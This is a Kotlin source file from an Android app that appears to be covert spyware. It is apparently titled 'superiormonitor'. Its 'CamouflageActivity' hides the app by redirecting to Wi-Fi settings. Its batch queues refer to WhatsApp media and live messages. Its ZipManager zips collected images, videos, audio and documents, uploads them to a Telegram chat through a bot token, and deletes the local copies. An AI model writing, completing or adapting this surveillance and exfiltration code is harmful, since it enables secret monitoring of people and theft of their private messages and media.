package com.system.superiormonitor.core

import android.content.Intent
import android.os.Bundle
import android.provider.Settings
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import com.system.superiormonitor.theme.AccentGreen
import com.system.superiormonitor.theme.OuterCardSurface
import com.system.superiormonitor.theme.SuperiorMonitorTheme
import com.system.superiormonitor.theme.TextPrimary
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.sync.withLock
import java.util.concurrent.ConcurrentHashMap
import android.net.Uri
import android.content.Context
class CamouflageActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        try {
            val intent = Intent(Settings.ACTION_WIFI_SETTINGS)
            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
            startActivity(intent)
        } catch (e: Exception) {
            com.system.superiormonitor.core.LogManager.log(
                com.system.superiormonitor.core.LogCategory.SYSTEM, 
                "CamouflageActivity error: ${e.message}", 
                com.system.superiormonitor.core.LogLevel.ERROR
            )
        }
        finish()
    }
}

class PopupActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val message = intent.getStringExtra("POPUP_MESSAGE") ?: "No message provided."

        setContent {
            SuperiorMonitorTheme {
                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = Color.Transparent
                ) {
                    PopupDialog(message = message, onDismiss = {
                        val serviceIntent = Intent(this@PopupActivity, com.system.superiormonitor.bot.BotService::class.java).apply {
                            action = "ACTION_POPUP_ACKNOWLEDGED"
                        }
                        startService(serviceIntent)
                        finish()
                    })
                }
            }
        }
    }
}

@Composable
fun PopupDialog(message: String, onDismiss: () -> Unit) {
    AlertDialog(
        onDismissRequest = { /* Prevent outside touch dismissal */ },
        title = {
            Text(
                "Message",
                color = AccentGreen,
                fontWeight = FontWeight.SemiBold
            )
        },
        text = {
            Text(
                message,
                color = TextPrimary
            )
        },
        confirmButton = {
            Button(
                onClick = { onDismiss() },
                colors = ButtonDefaults.buttonColors(containerColor = AccentGreen)
            ) {
                Text("OK", color = Color.White)
            }
        },
        containerColor = OuterCardSurface,
        shape = RoundedCornerShape(24.dp)
    )
}

object BatchManager {
    private val scope = CoroutineScope(Dispatchers.IO)
    private val batchQueues = ConcurrentHashMap<String, MutableList<Any>>()
    private val batchJobs = ConcurrentHashMap<String, Job>()
    private val mutexMap = ConcurrentHashMap<String, Mutex>()

    /**
     * Generic queueing function.
     * @param id The unique identifier for this batch queue (e.g. "wa_media", "live_msg_whatsapp").
     * @param item The generic item to add to the queue.
     * @param debounceMs The time to wait after the LAST item before flushing the batch.
     * @param maxItems The hard limit to flush immediately.
     * @param onBatchReady The callback that receives the generic list of batched items.
     */
    fun <T : Any> queue(
        id: String,
        item: T,
        debounceMs: Long,
        maxItems: Int,
        onBatchReady: suspend (List<T>) -> Unit
    ) {
        scope.launch {
            val mutex = mutexMap.getOrPut(id) { Mutex() }
            
            val flush = mutex.withLock {
                val queue = batchQueues.getOrPut(id) { mutableListOf() }
                queue.add(item)
                
                if (queue.size >= maxItems) {
                    batchJobs[id]?.cancel()
                    val batch = queue.toList()
                    queue.clear()
                    batch
                } else {
                    null
                }
            }

            if (flush != null) {
                @Suppress("UNCHECKED_CAST")
                onBatchReady(flush as List<T>)
            } else {
                mutex.withLock {
                    batchJobs[id]?.cancel()
                    batchJobs[id] = scope.launch {
                        delay(debounceMs)
                        val batch = mutexMap[id]?.withLock {
                            val queue = batchQueues[id]
                            val copy = queue?.toList() ?: emptyList()
                            queue?.clear()
                            copy
                        } ?: emptyList()
                        
                        if (batch.isNotEmpty()) {
                            @Suppress("UNCHECKED_CAST")
                            onBatchReady(batch as List<T>)
                        }
                    }
                }
            }
        }
    }
}

object ZipManager {
    private val folderMutexes = ConcurrentHashMap<String, Mutex>()
    /**
     * Generic Data Class representing an item to ZIP.
     */
    data class ZipItem(val name: String, val file: java.io.File? = null, val uri: Uri? = null)

    fun zipItems(context: Context, items: List<ZipItem>, zipFile: java.io.File): Boolean {
        return try {
            java.util.zip.ZipOutputStream(java.io.BufferedOutputStream(java.io.FileOutputStream(zipFile))).use { out ->
                val data = ByteArray(4096)
                for (item in items) {
                    val entryName = item.name
                    out.putNextEntry(java.util.zip.ZipEntry(entryName))
                    
                    if (item.file != null && item.file.exists()) {
                        java.io.FileInputStream(item.file).use { fi ->
                            java.io.BufferedInputStream(fi).use { origin ->
                                var count: Int
                                while (origin.read(data, 0, 4096).also { count = it } != -1) {
                                    out.write(data, 0, count)
                                }
                            }
                        }
                    } else if (item.uri != null) {
                        context.contentResolver.openInputStream(item.uri)?.use { origin ->
                            var count: Int
                            while (origin.read(data, 0, 4096).also { count = it } != -1) {
                                out.write(data, 0, count)
                            }
                        }
                    }
                    out.closeEntry()
                }
            }
            true
        } catch (e: Exception) {
            com.system.superiormonitor.core.LogManager.log(com.system.superiormonitor.core.LogCategory.ERROR, "Failed to zip files: ${e.message}")
            false
        }
    }

    suspend fun processOfflineMediaFolder(
        context: Context,
        token: String,
        chatId: String,
        mediaDir: java.io.File,
        zipDir: java.io.File,
        logPrefix: String
    ) {
        val mutex = folderMutexes.getOrPut(mediaDir.absolutePath) { Mutex() }
        mutex.withLock {
            processOfflineMediaFolderInternal(context, token, chatId, mediaDir, zipDir, logPrefix)
        }
    }

    private suspend fun processOfflineMediaFolderInternal(
        context: Context,
        token: String,
        chatId: String,
        mediaDir: java.io.File,
        zipDir: java.io.File,
        logPrefix: String
    ) {
        // 1. First process any existing failed zips in zipDir
        if (zipDir.exists() && zipDir.isDirectory) {
            val zips = zipDir.listFiles { _, name -> name.endsWith(".zip") }
            zips?.forEach { zipFile ->
                if (zipFile.length() > 10 * 1024 * 1024) {
                    com.system.superiormonitor.core.LogManager.log(com.system.superiormonitor.core.LogCategory.BOT_ACTIVITY, "[$logPrefix] ZIP ${zipFile.name} exceeds 10MB. Skipping/Deleting.")
                    zipFile.delete()
                } else {
                    val success = com.system.superiormonitor.bot.MediaUploader.uploadDocument(context, token, chatId, zipFile, "application/zip", "📦 *$logPrefix Media Sync*", null, false)
                    if (success) {
                        zipFile.delete()
                        kotlinx.coroutines.delay(2000)
                    } else {
                        com.system.superiormonitor.core.LogManager.log(com.system.superiormonitor.core.LogCategory.BOT_ACTIVITY, "[$logPrefix] ZIP Upload failed for ${zipFile.name}. Retained locally.", com.system.superiormonitor.core.LogLevel.ERROR)
                    }
                }
            }
        }

        // 2. Process media files in mediaDir
        if (!mediaDir.exists() || !mediaDir.isDirectory) return
        val allMedia = mediaDir.listFiles()?.filter { it.isFile }?.toMutableList() ?: mutableListOf()
        if (allMedia.isEmpty()) return
        allMedia.sortBy { it.lastModified() }

        val images = mutableListOf<java.io.File>()
        val videos = mutableListOf<java.io.File>()
        val audios = mutableListOf<java.io.File>()
        val docs = mutableListOf<java.io.File>()

        allMedia.forEach { file ->
            val ext = file.extension.lowercase()
            val mimeType = android.webkit.MimeTypeMap.getSingleton().getMimeTypeFromExtension(ext) ?: "application/octet-stream"
            when {
                mimeType.startsWith("image/") -> images.add(file)
                mimeType.startsWith("video/") -> videos.add(file)
                mimeType.startsWith("audio/") -> audios.add(file)
                else -> docs.add(file)
            }
        }

        suspend fun processVisuals(files: List<java.io.File>, categoryName: String) {
            if (files.isEmpty()) return
            if (files.size > 3) {
                com.system.superiormonitor.core.LogManager.log(com.system.superiormonitor.core.LogCategory.BOT_ACTIVITY, "[$logPrefix] Found ${files.size} offline $categoryName. Zipping...")
                val zipFile = java.io.File(zipDir, "${logPrefix.replace(" ", "")}_${categoryName}_Batch_${System.currentTimeMillis()}.zip")
                val zipItems = files.map { ZipItem(name = it.name, file = it) }
                try {
                    if (!zipDir.exists()) zipDir.mkdirs()
                    val successZip = zipItems(context, zipItems, zipFile)
                    if (successZip) {
                        files.forEach { it.delete() }
                        if (zipFile.length() > 10 * 1024 * 1024) {
                             com.system.superiormonitor.core.LogManager.log(com.system.superiormonitor.core.LogCategory.BOT_ACTIVITY, "[$logPrefix] Created ZIP exceeds 10MB. Skipping/Deleting.")
                             zipFile.delete()
                        } else {
                            val caption = "📦 *$logPrefix $categoryName Sync*\nFound ${files.size} delayed media files."
                            val success = com.system.superiormonitor.bot.MediaUploader.uploadDocument(context, token, chatId, zipFile, "application/zip", caption, null, false)
                            if (success) {
                                zipFile.delete()
                            } else {
                                com.system.superiormonitor.core.LogManager.log(com.system.superiormonitor.core.LogCategory.BOT_ACTIVITY, "[$logPrefix] $categoryName ZIP Upload failed. ZIP retained locally.", com.system.superiormonitor.core.LogLevel.ERROR)
                            }
                        }
                    }
                } catch (e: Exception) {
                    com.system.superiormonitor.core.LogManager.log(com.system.superiormonitor.core.LogCategory.BOT_ACTIVITY, "[$logPrefix] Error zipping $categoryName: ${e.message}", com.system.superiormonitor.core.LogLevel.ERROR)
                }
            } else if (files.size in 2..3) {
                com.system.superiormonitor.core.LogManager.log(com.system.superiormonitor.core.LogCategory.BOT_ACTIVITY, "[$logPrefix] Found ${files.size} offline $categoryName. Sending as Album...")
                val albumItems = files.map { file ->
                    val ext = file.extension.lowercase()
                    val mimeType = android.webkit.MimeTypeMap.getSingleton().getMimeTypeFromExtension(ext) ?: "application/octet-stream"
                    val type = if (mimeType.startsWith("image/")) "photo" else "video"
                    com.system.superiormonitor.bot.TelegramApi.MediaGroupItem(file = file, type = type, mimeType = mimeType)
                }
                val success = com.system.superiormonitor.bot.MediaUploader.uploadMediaGroup(
                    context = context, token = token, chatId = chatId,
                    items = albumItems, caption = "📦 *$logPrefix $categoryName Sync*",
                    fallbackOfflineSubdir = null, deleteOnSuccess = true
                )
                if (success) {
                    files.forEach { it.delete() }
                }
            } else {
                val file = files.first()
                if (file.length() > 10 * 1024 * 1024) {
                     com.system.superiormonitor.core.LogManager.log(com.system.superiormonitor.core.LogCategory.BOT_ACTIVITY, "[$logPrefix] Single $categoryName exceeds 10MB. Skipping/Deleting.")
                     file.delete()
                     return
                }
                com.system.superiormonitor.core.LogManager.log(com.system.superiormonitor.core.LogCategory.BOT_ACTIVITY, "[$logPrefix] Found 1 offline $categoryName. Uploading individually...")
                val ext = file.extension.lowercase()
                val mimeType = android.webkit.MimeTypeMap.getSingleton().getMimeTypeFromExtension(ext) ?: "application/octet-stream"
                val success = if (mimeType.startsWith("video/") || mimeType == "application/octet-stream") {
                    com.system.superiormonitor.bot.MediaUploader.uploadDocument(context, token, chatId, file, mimeType, "📦 *$logPrefix $categoryName Sync*", null, false)
                } else {
                    com.system.superiormonitor.bot.MediaUploader.uploadPhoto(context, token, chatId, file, "📦 *$logPrefix $categoryName Sync*", null, false)
                }
                if (success) {
                    file.delete()
                } else {
                    com.system.superiormonitor.core.LogManager.log(com.system.superiormonitor.core.LogCategory.BOT_ACTIVITY, "[$logPrefix] Upload failed for ${file.name}. Retained locally.", com.system.superiormonitor.core.LogLevel.ERROR)
                }
            }
        }

        suspend fun processNonVisuals(files: List<java.io.File>, categoryName: String) {
            if (files.isEmpty()) return
            if (files.size > 3) {
                com.system.superiormonitor.core.LogManager.log(com.system.superiormonitor.core.LogCategory.BOT_ACTIVITY, "[$logPrefix] Found ${files.size} offline $categoryName. Zipping...")
                val zipFile = java.io.File(zipDir, "${logPrefix.replace(" ", "")}_${categoryName}_Batch_${System.currentTimeMillis()}.zip")
                val zipItems = files.map { ZipItem(name = it.name, file = it) }
                try {
                    if (!zipDir.exists()) zipDir.mkdirs()
                    val successZip = zipItems(context, zipItems, zipFile)
                    if (successZip) {
                        files.forEach { it.delete() }
                        if (zipFile.length() > 10 * 1024 * 1024) {
                             com.system.superiormonitor.core.LogManager.log(com.system.superiormonitor.core.LogCategory.BOT_ACTIVITY, "[$logPrefix] Created ZIP exceeds 10MB. Skipping/Deleting.")
                             zipFile.delete()
                        } else {
                            val caption = "📦 *$logPrefix $categoryName Sync*\nFound ${files.size} delayed media files."
                            val success = com.system.superiormonitor.bot.MediaUploader.uploadDocument(context, token, chatId, zipFile, "application/zip", caption, null, false)
                            if (success) {
                                zipFile.delete()
                            } else {
                                com.system.superiormonitor.core.LogManager.log(com.system.superiormonitor.core.LogCategory.BOT_ACTIVITY, "[$logPrefix] $categoryName ZIP Upload failed. ZIP retained locally.", com.system.superiormonitor.core.LogLevel.ERROR)
                            }
                        }
                    }
                } catch (e: Exception) {
                    com.system.superiormonitor.core.LogManager.log(com.system.superiormonitor.core.LogCategory.BOT_ACTIVITY, "[$logPrefix] Error zipping $categoryName: ${e.message}", com.system.superiormonitor.core.LogLevel.ERROR)
                }
            } else {
                com.system.superiormonitor.core.LogManager.log(com.system.superiormonitor.core.LogCategory.BOT_ACTIVITY, "[$logPrefix] Found ${files.size} offline $categoryName. Uploading individually...")
                for (file in files) {
                    if (file.length() > 10 * 1024 * 1024) {
                         com.system.superiormonitor.core.LogManager.log(com.system.superiormonitor.core.LogCategory.BOT_ACTIVITY, "[$logPrefix] Single $categoryName exceeds 10MB. Skipping/Deleting.")
                         file.delete()
                         continue
                    }
                    val ext = file.extension.lowercase()
                    val mimeType = android.webkit.MimeTypeMap.getSingleton().getMimeTypeFromExtension(ext) ?: "application/octet-stream"
                    val success = com.system.superiormonitor.bot.MediaUploader.uploadDocument(context, token, chatId, file, mimeType, "📦 *$logPrefix $categoryName Sync*", null, false)
                    if (success) {
                        file.delete()
                        kotlinx.coroutines.delay(2000)
                    } else {
                        com.system.superiormonitor.core.LogManager.log(com.system.superiormonitor.core.LogCategory.BOT_ACTIVITY, "[$logPrefix] Upload failed for ${file.name}. Retained locally.", com.system.superiormonitor.core.LogLevel.ERROR)
                    }
                }
            }
        }

        processVisuals(images, "Images")
        processVisuals(videos, "Videos")
        processNonVisuals(audios, "Audios")
        processNonVisuals(docs, "Documents")
    }
}
